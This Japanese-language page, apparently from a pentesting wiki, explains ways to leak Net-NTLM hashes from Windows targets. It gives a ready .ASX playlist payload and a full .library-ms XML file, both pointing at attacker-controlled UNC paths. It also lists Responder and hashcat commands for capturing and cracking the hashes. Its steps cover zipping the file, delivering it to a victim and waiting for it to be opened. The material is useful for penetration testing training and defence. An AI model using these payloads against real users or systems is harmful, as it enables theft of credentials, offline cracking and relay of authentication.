# NTLM creds を盗む場所

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) の素晴らしいアイデアをすべて確認してください。オンラインで microsoft word ファイルをダウンロードするケースから、ntlm leaks ソース: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md および [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player プレイリスト (.ASX/.WAX)

制御下の Windows Media Player プレイリストをターゲットに開かせるかプレビューさせることができれば、エントリを UNC パスに向けることで Net‑NTLMv2 を leak できます。WMP は参照されたメディアを SMB 経由で取得しようとし、暗黙的に認証します。

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Collection と cracking のフロー:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer は、ZIP アーカイブ内から直接開かれた .library-ms ファイルを安全でない方法で処理します。library 定義がリモートの UNC パス（例: \\attacker\share）を指している場合、ZIP 内の .library-ms を参照または起動するだけで Explorer がその UNC を列挙し、攻撃者に対して NTLM 認証を送出します。これにより NetNTLMv2 が生成され、オフラインでクラッキングされるか、あるいは中継される可能性があります。

攻撃者の UNC を指す最小限の .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
## 操作手順
- 上記の XML を使って .library-ms ファイルを作成する（IP/ホスト名を設定する）。
- それを ZIP 化する（Windows の場合: Send to → Compressed (zipped) folder）し、ZIP をターゲットに配布する。
- NTLM キャプチャリスナーを起動し、被害者が ZIP 内から .library-ms を開くのを待つ。

## References
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
